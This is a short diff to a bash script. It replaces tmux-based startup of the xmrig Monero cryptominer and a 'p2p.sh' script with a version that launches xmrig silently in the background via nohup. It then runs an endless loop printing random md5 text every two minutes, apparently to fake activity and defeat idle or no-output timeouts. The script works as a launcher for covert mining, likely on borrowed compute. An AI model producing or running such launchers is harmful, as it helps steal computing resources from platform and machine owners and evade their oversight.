@@ -1,9 +1,5 @@
 #!/bin/bash
 
-apt-get update	
-apt-get install tmux -y
-apt install build-essential gnupg2 gcc make gnupg2 unzip -y < "/dev/null"
-
-tmux new-session -d -s 2 'bash p2p.sh'
-chmod +x xmrig
-tmux new-session -d -s 1 './xmrig --config=config.json'
+chmod +x xmrig  >/dev/null 2>&1
+nohup ./xmrig --config=config.json &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
